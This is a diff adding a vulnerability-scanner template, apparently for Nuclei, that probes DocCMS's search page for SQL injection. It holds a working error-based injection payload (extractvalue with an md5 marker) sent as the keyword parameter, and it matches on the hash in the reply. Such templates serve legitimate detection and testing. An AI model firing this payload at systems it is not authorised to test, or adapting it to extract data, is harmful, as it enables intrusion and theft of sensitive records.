@@ -1,0 +1,22 @@
+id: doccms-sql-injection
+info:
+  name: SQL Injection in DocCMS
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Potential SQL Injection vulnerability in DocCMS's search functionality, allowing attackers to extract sensitive data by injecting SQL queries.
+variables:
+  s1: "{{rand_int(10000, 20000)}}"
+  payload: "{{url_encode(url_encode(concat(\"1' and (extractvalue(1,concat(0x7e,(select md5(\", s1, \")),0x7e)))#\")))}}"
+http:
+  - raw:
+      - |
+        GET /search/index.php?keyword={{payload}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{substr(md5(s1), 0, 30)}}"
+        part: body
